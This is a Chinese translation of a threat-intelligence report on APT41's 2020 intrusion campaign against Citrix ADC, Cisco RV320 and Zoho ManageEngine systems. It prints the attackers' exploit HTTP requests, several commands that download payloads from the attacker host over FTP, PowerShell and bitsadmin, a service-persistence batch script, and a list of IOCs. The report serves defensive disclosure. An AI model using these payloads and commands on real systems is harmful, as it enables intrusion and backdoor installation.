@@ -1,0 +1,279 @@
+**研究人员发现自今年开始APT41开展了大范围的网络活动。从1月20日到3月11日APT41利用了Citrix
+NetScaler/ADC，Cisco路由器和Zoho ManageEngine Desktop Central等漏洞进行攻击攻击活动。**
+
+目标国家包括澳大利亚，加拿大，丹麦，芬兰，法国，印度，意大利，日本，马来西亚，墨西哥，菲律宾，波兰，卡塔尔，沙特，新加坡，瑞典，瑞士，阿联酋，英国和美国等。目标行业包括：银行/金融，建筑，国防工业，政府，医疗，高科技，高等教育，法律，制造业，媒体，石油和天然气，制药，房地产，电信，运输，旅行等。目前尚不清楚APT41是扫描全网进行大规模攻击还是选择了特定目标，但从受害者角度来看攻击更具针对性。
+
+## 漏洞利用
+
+### CVE-2019-19781 (Citrix Application Delivery Controller [ADC])
+
+2020年1月20日开始，APT41使用IP地址66.42.98 [.] 220尝试利用漏洞CVE-2019-19781（于2019年12月17日发布）。
+
+时间线：
+
+![](https://image.3001.net/images/20200328/1585375867_5e7eea7b47479.png!small)
+
+最初利用CVE-2019-19781攻击发生在2020年1月20日和2020年1月21日，攻击活动中会执行命令‘file /bin/pwd’。
+首先将确认系统是否存在漏洞，有没有部署相关漏洞缓解措施。 其次返回目标体系结构相关信息，为APT41后续部署后门提供信息。
+
+所有观察到的请求仅针对Citrix设备执行，APT41利用已知设备列表进行操作。
+
+HTTP POST示例：
+
+    
+    
+    POST /vpns/portal/scripts/newbm.pl HTTP/1.1  
+    Host: [redacted]  
+    Connection: close  
+    Accept-Encoding: gzip, deflate  
+    Accept: */*  
+    User-Agent: python-requests/2.22.0  
+    NSC_NONCE: nsroot  
+    NSC_USER: ../../../netscaler/portal/templates/[redacted]  
+    Content-Length: 96  
+      
+    url=http://example.com&title=[redacted]&desc=[% template.new('BLOCK' = 'print `file /bin/pwd`') %]
+
+1月23日至2月1日之间APT41活动暂停，从2月1日开始APT41开始使用CVE-2019-19781漏洞，这些载荷通过FTP下载。
+APT41执行命令'/usr/bin/ftp -o /tmp/bsd
+ftp://test:[redacted]\@66.42.98[.]220/bsd’，连接到66.42.98 [.] 220，使用用户名“
+test”和密码登录到FTP服务器，然后下载“ bsd”有效负载（可能是后门）。
+
+HTTP POST示例：
+
+    
+    
+    POST /vpn/../vpns/portal/scripts/newbm.pl HTTP/1.1
+    
+    Accept-Encoding: identity
+    
+    Content-Length: 147
+    
+    Connection: close
+    
+    Nsc_User: ../../../netscaler/portal/templates/[redacted]
+    
+    User-Agent: Python-urllib/2.7
+    
+    Nsc_Nonce: nsroot
+    
+    Host: [redacted]
+    
+    Content-Type: application/x-www-form-urlencoded
+    
+    url=http://example.com&title=[redacted]&desc=[% template.new('BLOCK' = 'print `/usr/bin/ftp -o /tmp/bsd ftp://test:[redacted]\@66.42.98[.]220/bsd`') %]
+
+2月24日和2月25日CVE-2019-19781的利用次数显着增加，仅载荷名发生了变化。
+
+    
+    
+    POST /vpn/../vpns/portal/scripts/newbm.pl HTTP/1.1
+    
+    Accept-Encoding: identity
+    
+    Content-Length: 145
+    
+    Connection: close
+    
+    Nsc_User: ../../../netscaler/portal/templates/[redacted]
+    
+    User-Agent: Python-urllib/2.7
+    
+    Nsc_Nonce: nsroot
+    
+    Host: [redacted]
+    
+    Content-Type: application/x-www-form-urlencoded
+    
+    url=http://example.com&title= [redacted]&desc=[% template.new('BLOCK' = 'print `/usr/bin/ftp -o /tmp/un ftp://test:[redacted]\@66.42.98[.]220/un`') %]
+
+### Cisco Router
+
+2020年2月21日APT41成功攻击了一家电信组织的Cisco RV320路由器，并下载了为名为“
+fuc”（MD5：155e98e5ca8d662fad7dc84187340cbc）的64位MIPS有效负载。Metasploit模块结合了两个CVE（CVE-2019-1653和CVE-2019-1652）在Cisco
+RV320和RV325小型企业路由器上实现远程代码执行，并使用wget下载有效负载。
+
+66.42.98 [.] 220还托管了文件[http://66.42.98](https://www.freebuf.com/wp-admin/post.php?post=231801&action=edit)[.]
+220/test/1.txt(MD5：c0c467c8e9b2046d7053642cc9bdd57d)的内容为“
+cat/etc/flash/etc/nk_sysconfig”，该命令可在Cisco RV320路由器上执行显示当前配置。
+
+> [Cisco Small Business RV320 and RV325 Routers Information Disclosure
+> Vulnerability](https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-> sa-20190123-rv-info)
+>
+> [Cisco Small Business RV320 and RV325 Routers Command Injection
+> Vulnerability](https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-> sa-20190123-rv-inject)
+
+### CVE-2020-10189 (Zoho ManageEngine Zero-Day Vulnerability)
+
+3月5日研究人员发布了CVE-2020-10189验证代码。 从3月8日开始APT41使用91.208.184 [.] 78来试图利用Zoho
+ManageEngine漏洞，有效负载（install.bat和storesyncsvc.dll）有两个不同的变化。
+在第一个变体中，使用CVE-2020-10189漏洞直接上传“
+logger.zip”，其中包含一组命令可使用PowerShell下载并执行install.bat和storesyncsvc.dll。
+
+    
+    
+    java/lang/Runtime
+    
+    getRuntime
+    
+    ()Ljava/lang/Runtime;
+    
+    Xcmd /c powershell $client = new-object System.Net.WebClient;$client.DownloadFile('http://66.42.98[.]220:12345/test/install.bat','C:\  
+    Windows\Temp\install.bat')&powershell $client = new-object System.Net.WebClient;$client.DownloadFile('http://66.42.98[.]220:12345/test/storesyncsvc.dll','  
+    C:\Windows\Temp\storesyncsvc.dll')&C:\Windows\Temp\install.bat
+    
+    '(Ljava/lang/String;)Ljava/lang/Process;
+    
+    StackMapTable
+    
+    ysoserial/Pwner76328858520609
+    
+    Lysoserial/Pwner76328858520609;
+
+在第二个版本中APT41利用Microsoft BITSAdmin工具从66.42.98 [.]
+220端口12345下载install.bat（MD5：7966c2c546b71e800397a67f942858d0）。
+
+    
+    
+    Parent Process: C:\ManageEngine\DesktopCentral_Server\jre\bin\java.exe
+    
+    Process Arguments: cmd /c bitsadmin /transfer bbbb http://66.42.98[.]220:12345/test/install.bat C:\Users\Public\install.bat
+
+两种变体都使用install.bat批处理文件来安装名为storesyncsvc.dll（MD5：5909983db4d9023e4098e56361c96a6f）。
+
+install.bat内容：
+
+    
+    
+    @echo off
+    
+    set "WORK_DIR=C:\Windows\System32"
+    
+    set "DLL_NAME=storesyncsvc.dll"
+    
+    set "SERVICE_NAME=StorSyncSvc"
+    
+    set "DISPLAY_NAME=Storage Sync Service"
+    
+    set "DESCRIPTION=The Storage Sync Service is the top-level resource for File Sync. It creates sync relationships with multiple storage accounts via multiple sync groups. If this service is stopped or disabled, applications will be unable to run collectly."
+    
+     sc stop %SERVICE_NAME%
+    
+    sc delete %SERVICE_NAME%
+    
+    mkdir %WORK_DIR%
+    
+    copy "%~dp0%DLL_NAME%" "%WORK_DIR%" /Y
+    
+    reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost" /v "%SERVICE_NAME%" /t REG_MULTI_SZ /d "%SERVICE_NAME%" /f
+    
+    sc create "%SERVICE_NAME%" binPath= "%SystemRoot%\system32\svchost.exe -k %SERVICE_NAME%" type= share start= auto error= ignore DisplayName= "%DISPLAY_NAME%"
+    
+    SC failure "%SERVICE_NAME%" reset= 86400 actions= restart/60000/restart/60000/restart/60000
+    
+    sc description "%SERVICE_NAME%" "%DESCRIPTION%"
+    
+    reg add "HKLM\SYSTEM\CurrentControlSet\Services\%SERVICE_NAME%\Parameters" /f
+    
+    reg add "HKLM\SYSTEM\CurrentControlSet\Services\%SERVICE_NAME%\Parameters" /v "ServiceDll" /t REG_EXPAND_SZ /d "%WORK_DIR%\%DLL_NAME%" /f
+    
+    net start "%SERVICE_NAME%"
+
+与c2服务通联：
+
+    
+    
+    GET /jquery-3.3.1.min.js HTTP/1.1
+    
+    Host: cdn.bootcss.com
+    
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+    
+    Referer: http://cdn.bootcss.com/
+    
+    Accept-Encoding: gzip, deflate
+    
+    Cookie: __cfduid=CdkIb8kXFOR_9Mn48DQwhIEuIEgn2VGDa_XZK_xAN47OjPNRMpJawYvnAhPJYM
+    
+    DA8y_rXEJQGZ6Xlkp_wCoqnImD-bj4DqdTNbj87Rl1kIvZbefE3nmNunlyMJZTrDZfu4EV6oxB8yKMJfLXydC5YF9OeZwqBSs3Tun12BVFWLI
+    
+    User-Agent: Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko
+    
+    Connection: Keep-Alive Cache-Control: no-cache
+
+在攻击利用几个小时内，APT41使用storecyncsvc.dll
+BEACON后门下载了具有不同C2地址的辅助后门，然后下载2.exe（MD5：3e856162c36b532925c8226b4ed3481c）。2.exe是VMProtected
+Meterpreter下载器，用于下载Cobalt Strike BEACON shellcode。该组利用多次入侵来延迟对其其他工具的分析。
+
+## 总结
+
+APT41这次活动中的扫描和攻击体现了其漏洞利用速度越来越快，目标信息搜集范围逐步扩大。此前美国防部确认，APT41成功利用CVE-2019-3396（Atlassian
+Confluence）攻击美国一所大学。可见APT41在从事间谍活动同时也在进行以经济利益为动机的网络活动。
+
+### IOCs
+
+Type | Indicator  
+---|---  
+CVE-2019-19781 Exploitation (Citrix Application Delivery Control) |
+66.42.98[.]220  
+CVE-2019-19781 exploitation attempts with a payload of ‘file /bin/pwd’  
+CVE-2019-19781 exploitation attempts with a payload of ‘/usr/bin/ftp -o
+/tmp/un ftp://test:[redacted]\@66.42.98[.]220/bsd’  
+CVE-2019-19781 exploitation attempts with a payload of ‘/usr/bin/ftp -o
+/tmp/un ftp://test:[redacted]\@66.42.98[.]220/un’  
+/tmp/bsd  
+/tmp/un  
+Cisco Router Exploitation | 66.42.98\\.220  
+‘1.txt’ (MD5: c0c467c8e9b2046d7053642cc9bdd57d)  
+‘fuc’ (MD5: 155e98e5ca8d662fad7dc84187340cbc  
+CVE-2020-10189 (Zoho ManageEngine Desktop Central) | 66.42.98[.]220  
+91.208.184[.]78  
+74.82.201[.]8  
+exchange.dumb1[.]com  
+install.bat (MD5: 7966c2c546b71e800397a67f942858d0)  
+storesyncsvc.dll (MD5: 5909983db4d9023e4098e56361c96a6f)  
+C:\Windows\Temp\storesyncsvc.dll  
+C:\Windows\Temp\install.bat  
+2.exe (MD5: 3e856162c36b532925c8226b4ed3481c)  
+C:\Users\\[redacted]\install.bat  
+TzGG (MD5: 659bd19b562059f3f0cc978e15624fd9)  
+C:\ManageEngine\DesktopCentral_Server\jre\bin\java.exe spawning cmd.exe and/or
+bitsadmin.exe  
+Certutil.exe downloading 2.exe and/or payloads from 91.208.184[.]78  
+PowerShell downloading files with Net.WebClient  
+Platform | Signature Name  
+---|---  
+Endpoint Security | BITSADMIN.EXE MULTISTAGE DOWNLOADER (METHODOLOGY)  
+CERTUTIL.EXE DOWNLOADER A (UTILITY)  
+Generic.mg.5909983db4d9023e  
+Generic.mg.3e856162c36b5329  
+POWERSHELL DOWNLOADER (METHODOLOGY)  
+SUSPICIOUS BITSADMIN USAGE B (METHODOLOGY)  
+Network Security | Backdoor.Meterpreter  
+DTI.Callback  
+Exploit.CitrixNetScaler  
+Trojan.METASTAGE  
+Exploit.ZohoManageEngine.CVE-2020-10198.Pwner  
+Exploit.ZohoManageEngine.CVE-2020-10198.mdmLogUploader  
+Helix | CITRIX ADC [Suspicious Commands]  
+EXPLOIT - CITRIX ADC [CVE-2019-19781 Exploit Attempt]  
+EXPLOIT - CITRIX ADC [CVE-2019-19781 Exploit Success]  
+EXPLOIT - CITRIX ADC [CVE-2019-19781 Payload Access]  
+EXPLOIT - CITRIX ADC [CVE-2019-19781 Scanning]  
+MALWARE METHODOLOGY [Certutil User-Agent]  
+WINDOWS METHODOLOGY [BITSadmin Transfer]  
+WINDOWS METHODOLOGY [Certutil Downloader]  
+ATT&CK | Techniques  
+---|---  
+Initial Access | External Remote Services (T1133), Exploit Public-Facing
+Application (T1190)  
+Execution | PowerShell (T1086), Scripting (T1064)  
+Persistence | New Service (T1050)  
+Privilege Escalation | Exploitation for Privilege Escalation (T1068)  
+Command And Control | Remote File Copy (T1105), Commonly Used Port (T1436),
+Uncommonly Used Port (T1065), Custom Command and Control Protocol (T1094),
+Data Encoding (T1132), Standard Application Layer Protocol (T1071)  
+Defense Evasion | BITS Jobs (T1197), Process Injection (T1055)  
+  
+***参考来源：[fireeye](https://www.fireeye.com/blog/threat-research/2020/03/apt41-initiates-global-intrusion-campaign-using-multiple-exploits.html)，由Kriston编译，转载请注明来自FreeBuf.COM**
+
